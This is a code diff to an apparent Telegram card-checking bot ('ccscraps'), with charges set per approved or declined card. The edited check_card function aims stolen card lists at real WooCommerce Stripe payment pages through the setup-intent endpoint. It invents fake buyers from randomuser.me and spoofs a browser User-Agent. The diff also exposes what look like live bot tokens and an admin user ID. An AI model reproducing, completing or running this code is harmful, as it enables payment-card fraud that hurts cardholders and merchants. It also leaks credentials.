@@ -6,8 +6,6 @@ import time
 import json
 import uuid
 import sys
-import random
-import string
 import logging
 import io
 from datetime import datetime
@@ -39,9 +37,9 @@ signal.signal(signal.SIGINT, signal_handler)
 
 
 # --- 1. CONFIGURATION ---
-YOUR_BOT_TOKEN = "8435079339:AAGjDyIWrIbwq5v-Z6Qg6tfNQfF1cqiJMCY"
+YOUR_BOT_TOKEN = "8272028321:AAEk6b2t7NG19i86sy85ZxZ6JmKaqRPl90g"
 ADMIN_USER_ID = 7307757609
-BOT_NAME = "@ccscraps123_bot"
+BOT_NAME = "@wayboutay"
 
 COST_APPROVED = 2.0
 COST_DECLINED = 1.0
@@ -365,77 +363,31 @@ def check_card(lista, url_payment_page):
             )
             await conn.commit()
 
-# small sample of first names to pick from locally
-SAMPLE_FIRST_NAMES = [
-    "alex","sam","chris","jordan","taylor","morgan","casey","jamie","drew","devon",
-    "ashley","jess","pat","lee","riley","cameron","blake","kyle","logan","peyton"
-]
+    try:
+        parsed_url = urlparse(url_payment_page)
+        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+        http_referer = parsed_url.path
+        url_confirm = f"{base_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
+    except Exception:
+        return ('error', f"Invalid URL format: {url_payment_page}", "")
 
-def generate_local_user(local_length=15):
-    """Return (first_name, email) using local random generation.
-       local_length = number of chars before @gmail.com (default 15).
-    """
-    first_name = random.choice(SAMPLE_FIRST_NAMES)
-    # create a local-part of exactly local_length characters:
-    base = first_name.lower()
-    allowed = string.ascii_lowercase + string.digits
-    if len(base) >= local_length:
-        local_part = base[:local_length]
-    else:
-        pad = ''.join(random.choice(allowed) for _ in range(local_length - len(base)))
-        local_part = base + pad
-    email = f"{local_part}@gmail.com"
-    return first_name.capitalize(), email
+    print("   Generating random user data...")
+    try:
+        user_response = requests.get('https://randomuser.me/api/1.2/?nat=us', timeout=15)
+        user_response.raise_for_status()
+        random_user = user_response.json()['results'][0]
+        first_name = random_user['name']['first']
+        email = f"{first_name.lower()}{random.randint(100, 999)}@gmail.com"
+        print(f"   Generated User: {first_name}, Email: {email}")
+    except requests.exceptions.RequestException as e:
+        error_msg = f"Error fetching random user: {e}"
+        print(f"   {error_msg}")
+        return ('error', error_msg, "")
 
-# ---------- your existing logic (inside whatever function) ----------
-try:
-    parsed_url = urlparse(url_payment_page)
-    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
-    http_referer = parsed_url.path
-    url_confirm = f"{base_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
-except Exception:
-    return ('error', f"Invalid URL format: {url_payment_page}", "")
-
-print("   Generating random user data...")
-# Try the remote API first, but fall back to local generator on any failure
-first_name = None
-email = None
-
-try:
-    user_response = requests.get('https://randomuser.me/api/?nat=us', timeout=10)
-    user_response.raise_for_status()
-    data = user_response.json()
-    # defensive checks in case the API shape changed
-    results = data.get('results')
-    if results and isinstance(results, list) and 'name' in results[0]:
-        random_user = results[0]
-        first_name = random_user['name'].get('first', '').strip() or None
-        # if API gives a short name, we'll still ensure 15-char local-part below
-        candidate = (first_name.lower() if first_name else '') + str(random.randint(100, 999))
-        # build exactly 15 chars before @gmail.com:
-        allowed = string.ascii_lowercase + string.digits
-        if len(candidate) >= 15:
-            local_part = candidate[:15]
-        else:
-            pad = ''.join(random.choice(allowed) for _ in range(15 - len(candidate)))
-            local_part = candidate + pad
-        email = f"{local_part}@gmail.com"
-        print(f"   Generated User (from API): {first_name}, Email: {email}")
-    else:
-        # treat as failure and fall back
-        raise ValueError("Unexpected API response shape")
-
-except Exception as e:
-    # Log the error, then fall back to local generation
-    print(f"   Warning: remote user API failed ({e}). Falling back to local generator.")
-    first_name, email = generate_local_user(local_length=15)
-    print(f"   Generated User (local fallback): {first_name}, Email: {email}")
-
-# now you have `first_name` and `email` guaranteed; continue with your session logic
-with requests.Session() as session:
-    session.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-    })
+    with requests.Session() as session:
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
 
         try:
             print("   Step 1: Accessing payment page...")
